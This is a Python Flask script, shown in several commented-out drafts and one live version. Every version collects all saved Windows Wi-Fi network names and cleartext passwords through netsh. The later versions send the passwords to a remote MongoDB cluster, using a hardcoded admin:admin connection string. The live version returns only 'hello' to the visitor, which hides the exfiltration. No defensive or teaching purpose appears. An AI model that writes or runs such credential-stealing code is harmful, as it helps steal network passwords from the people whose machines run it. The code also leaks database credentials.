 

# # from flask import Flask, jsonify
# # import subprocess
# # import json

# # app = Flask(__name__)

# # def get_wifi_passwords():
# #     # Run the command to get a list of saved Wi-Fi profiles
# #     result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
# #     profiles = result.stdout

# #     # Find all profile names
# #     profile_names = [line.split(":")[1].strip() for line in profiles.split('\n') if "All User Profile" in line]

# #     wifi_details = []

# #     for profile in profile_names:
# #         # Run command to get the password for each profile
# #         profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
# #         profile_info_output = profile_info.stdout

# #         # Extract the password from the output
# #         password_line = [line.split(":")[1].strip() for line in profile_info_output.split('\n') if "Key Content" in line]
# #         password = password_line[0] if password_line else None

# #         wifi_details.append({
# #             'SSID': profile,
# #             'Password': password
# #         })

# #     return wifi_details

# # @app.route('/')
# # def index():
# #     # Fetch Wi-Fi details
# #     wifi_details = get_wifi_passwords()
    
# #     # Print Wi-Fi details on the server side
# #     print("Wi-Fi Details (Server-Side):")
# #     print(json.dumps(wifi_details, indent=4))
    
# #     # Return a generic message to the client, not the actual details
# #     return jsonify({"message": "Wi-Fi details have been retrieved and logged on the server."})

# # if __name__ == '__main__':
# #     app.run(debug=True)


# from flask import Flask, jsonify
# import subprocess
# import json
# import platform

# app = Flask(__name__)

# def get_wifi_passwords():
#     # Check if the platform is Windows
#     if platform.system() != "Windows":
#         return {"error": "Wi-Fi password retrieval is only supported on Windows."}

#     try:
#         # Run the command to get a list of saved Wi-Fi profiles
#         result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
#         profiles = result.stdout

#         # Find all profile names
#         profile_names = [line.split(":")[1].strip() for line in profiles.split('\n') if "All User Profile" in line]

#         wifi_details = []

#         for profile in profile_names:
#             # Run command to get the password for each profile
#             profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
#             profile_info_output = profile_info.stdout

#             # Extract the password from the output
#             password_line = [line.split(":")[1].strip() for line in profile_info_output.split('\n') if "Key Content" in line]
#             password = password_line[0] if password_line else None

#             wifi_details.append({
#                 'SSID': profile,
#                 'Password': password
#             })

#         return wifi_details

#     except Exception as e:
#         return {"error": str(e)}

# @app.route('/')
# def index():
#     # Fetch Wi-Fi details
#     wifi_details = get_wifi_passwords()
    
#     # Print Wi-Fi details on the server side (if on Windows)
#     if "error" not in wifi_details:
#         print("Wi-Fi Details (Server-Side):")
#         print(json.dumps(wifi_details, indent=4))
    
#     # Return either the Wi-Fi details or the error message
#     return jsonify(wifi_details)

# if __name__ == '__main__':
#     app.run(debug=True)


# from flask import Flask, jsonify
# import subprocess
# import json
# import platform
# from pymongo import MongoClient

# app = Flask(__name__)

# # MongoDB connection setup
# client = MongoClient('mongodb+srv://admin:admin@cluster0.ktqavpr.mongodb.net/wifi')  # Adjust the connection string if needed
# db = client['wifi_database']  # Use or create a database named 'wifi_database'
# collection = db['wifi_credentials']  # Use or create a collection named 'wifi_credentials'

# def get_wifi_passwords():
#     # Check if the platform is Windows
#     if platform.system() != "Windows":
#         return {"error": "Wi-Fi password retrieval is only supported on Windows."}

#     try:
#         # Run the command to get a list of saved Wi-Fi profiles
#         result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
#         profiles = result.stdout

#         # Find all profile names
#         profile_names = [line.split(":")[1].strip() for line in profiles.split('\n') if "All User Profile" in line]

#         wifi_details = []

#         for profile in profile_names:
#             # Run command to get the password for each profile
#             profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
#             profile_info_output = profile_info.stdout

#             # Extract the password from the output
#             password_line = [line.split(":")[1].strip() for line in profile_info_output.split('\n') if "Key Content" in line]
#             password = password_line[0] if password_line else None

#             wifi_details.append({
#                 'SSID': profile,
#                 'Password': password
#             })

#         return wifi_details

#     except Exception as e:
#         return {"error": str(e)}

# @app.route('/')
# def index():
#     # Fetch Wi-Fi details
#     wifi_details = get_wifi_passwords()

#     if "error" not in wifi_details:
#         # Insert the Wi-Fi details into MongoDB
#         result = collection.insert_many(wifi_details)
#         print(f"Inserted document IDs: {result.inserted_ids}")
    
#     # Print Wi-Fi details on the server side (if on Windows)
#     if "error" not in wifi_details:
#         print("Wi-Fi Details (Server-Side):")
#         print(json.dumps(wifi_details, indent=4))
    
#     # Return either the Wi-Fi details or the error message
#     return jsonify(wifi_details)

# if __name__ == '__main__':
#     app.run(debug=True)
 
from flask import Flask, render_template_string, request, redirect, url_for, Response
import subprocess
import platform
from pymongo import MongoClient
from bson import ObjectId

app = Flask(__name__)

# MongoDB connection setup
client = MongoClient('mongodb+srv://admin:admin@cluster0.ktqavpr.mongodb.net/wifi')  # Adjust the connection string if needed
db = client['wifi_database']  # Use or create a database named 'wifi_database'
collection = db['wifi_credentials']  # Use or create a collection named 'wifi_credentials'

def get_wifi_passwords():
    # Check if the platform is Windows
    if platform.system() != "Windows":
        return "Wi-Fi password retrieval is only supported on Windows."

    try:
        # Run the command to get a list of saved Wi-Fi profiles
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles = result.stdout

        # Find all profile names
        profile_names = [line.split(":")[1].strip() for line in profiles.split('\n') if "All User Profile" in line]

        wifi_details = []

        for profile in profile_names:
            # Run command to get the password for each profile
            profile_info = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True)
            profile_info_output = profile_info.stdout

            # Extract the password from the output
            password_line = [line.split(":")[1].strip() for line in profile_info_output.split('\n') if "Key Content" in line]
            password = password_line[0] if password_line else None

            wifi_details.append({
                'SSID': profile,
                'Password': password
            })

        return wifi_details

    except Exception as e:
        return f"Error: {str(e)}"

@app.route('/')
def index():
    wifi_details = get_wifi_passwords()

    if isinstance(wifi_details, str) and wifi_details.startswith("Error"):
        return wifi_details

    if "error" not in wifi_details:
        # Insert the Wi-Fi details into MongoDB
        result = collection.insert_many(wifi_details)
        inserted_ids = [str(id) for id in result.inserted_ids]  # Convert ObjectId to string

        # # Print Wi-Fi details on the server side (if on Windows)
        # print("Wi-Fi Details (Server-Side):")
        # for detail in wifi_details:
        #     print(f"SSID: {detail['SSID']}, Password: {detail['Password']}")

    
    return Response('hello')


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
